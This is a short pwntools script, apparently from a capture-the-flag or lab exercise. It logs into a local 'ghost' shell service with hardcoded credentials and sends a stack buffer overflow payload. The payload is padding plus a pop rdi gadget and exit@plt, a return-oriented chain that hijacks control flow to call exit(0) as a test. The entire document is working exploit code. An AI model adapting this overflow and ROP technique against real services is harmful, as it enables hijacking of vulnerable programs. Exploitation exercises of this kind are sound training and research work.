from pwn import *

context.binary = elf = ELF("./ghost")
context.log_level = "debug"

HOST, PORT = "127.0.0.1", 1337
OFFSET = 72

def test_exit_call():
    """Test calling exit() - should exit cleanly without crash"""
    p = remote(HOST, PORT)
    
    p.sendlineafter(b"Username:", b"operator")
    p.sendlineafter(b"Password:", b"ghostop")
    p.recvuntil(b"ghostshell> ")
    
    exit_plt = 0x401220  # exit@plt
    
    # Call exit(0) - we need to pass 0 as argument
    pop_rdi = 0x40131e
    
    payload = b"status" + b"A"*66
    payload += p64(pop_rdi)
    payload += p64(0)  # exit code 0
    payload += p64(exit_plt)
    
    log.info(f"Sending payload with exit()")
    p.sendline(payload)
    
    # The program should exit cleanly, no EOF error
    try:
        p.recv(timeout=1)
        log.success("exit() called successfully - program exited cleanly")
    except EOFError:
        log.success("Got EOF (expected - program exited)")
    
    p.close()

if __name__ == "__main__":
    test_exit_call()
